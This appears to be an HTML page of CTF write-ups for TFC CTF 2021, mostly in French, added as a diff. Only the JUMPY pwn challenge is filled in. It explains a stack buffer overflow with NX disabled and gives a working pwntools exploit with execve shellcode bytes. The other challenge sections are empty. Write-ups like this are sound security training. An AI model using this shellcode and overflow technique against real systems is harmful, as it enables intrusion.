@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="style.css">
+<link href='https://fonts.googleapis.com/css?family=Lato:100,400,700' rel='stylesheet' type='text/css'>
+<script src="script.js"></script>
+</head>
+<body>
+
+<nav class="navigation" id="mainNav">
+	<nav><h2>TFC CTF 2021</h2></nav>
+	<a class="navigation__link" href="#1">JUMPY(Pwn)</a>
+	<a class="navigation__link" href="#2">SECRET(Pwn)</a>
+	<a class="navigation__link" href="#3">SANTA(Pwn)</a>
+	<a class="navigation__link" href="#4">HEAPS DON'T LIE(Pwn)</a>
+	<a class="navigation__link" href="#5">PIXEL ART(Pwn)</a>
+	<a class="navigation__link" href="#6">SEA LANGUAGE 1(Crypto)</a>
+	<a class="navigation__link" href="#7">AM I DOING IT RIGHT?(Crypto)</a>
+</nav>
+
+<div class="page-section hero" id="1">
+	<h2>JUMPY(PWN)</h2>
+	<p>Output of checksek<br><br>
+	$checksec jumpy</p>
+	<img src="datas/checkseckjumpy.png">
+	<pre>
+	└─$ ./jumpy 
+	Jump, jump, jump... where are we going today?
+
+	aaaaaaaaaaaaaaaaaaaa
+	</pre>
+	<p>C code of Jumpy:</p>
+	<img src="datas/CJumpy.png">
+	<p>Le NX est désactivé donc nous pouvons éxecuter sur la pile.<br>
+	Dans le binaire il n'y a pas de fonction system ou une fonction quelconque pour lire le flag, alors le shellcode.<br>
+	Premièrement il faut le contrôler du RIP.
+	J'ai placé un breakpoint au niveau du ret pour le déboggage.
+	</p>
+	<img src="datas/disasmain.png" style="width: 100%;">
+	<p>Avec 0x38 on arrive à atteindre le RIP : "A"*0x38 + "BBBB"</p>
+	<img src="datas/jumpRIP.png" style="width: 100%;">
+	<p>Nous pouvons maintenant éxecuteter notre shellcode sur la pile.
+	Minute !
+	Le RIP contient une addresse.<br>
+	J'ai trouvé une fonction np dans le binaire pour nous faciliter la tâche.
+	</p>
+	<img src="datas/disasnp.png">
+	<img src="datas/npC.png">
+	<p>Cette focntion nous permettra d'exécuter notre shellcode.<br>
+	Il suffit de pushé l'addresse de np dans le RIP et notre shellcode après.<br>
+	np address: 0x00401142</p>
+	<pre>
+	<code class="language-python">
+  	from pwn import *
+
+	sh = process("./jumpy")
+	#sh = remote("34.65.228.239",1337)
+	shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+	payload = b"A"*(48+8) + p64(0x00401142) +shellcode
+
+	print(sh.recv().decode())
+	sh.sendline(payload)
+	sh.interactive()
+	</code>
+	</pre>
+	<p>Output</p>
+	<img src="datas/flag.png">
+</div>
+<div class="page-section" id="2">
+			<h1>SECRET(Pwn)</h1>
+</div>
+<div class="page-section" id="3">
+			<h1>SANTA(Pwn)</h1>
+</div>
+<div class="page-section" id="4">
+			<h1>HEAPS DON'T LIE(Pwn)</h1>
+</div>
+<div class="page-section" id="5">
+			<h1>PIXEL ART(Pwn)</h1>
+</div>
+<div class="page-section" id="6">
+			<h1>SEA LANGUAGE 1(Crypto)</h1>
+</div>
+<div class="page-section" id="7">
+			<h1>AM I DOING IT RIGHT?(Crypto)</h1>
+</div>
+
+</body>
+</html>
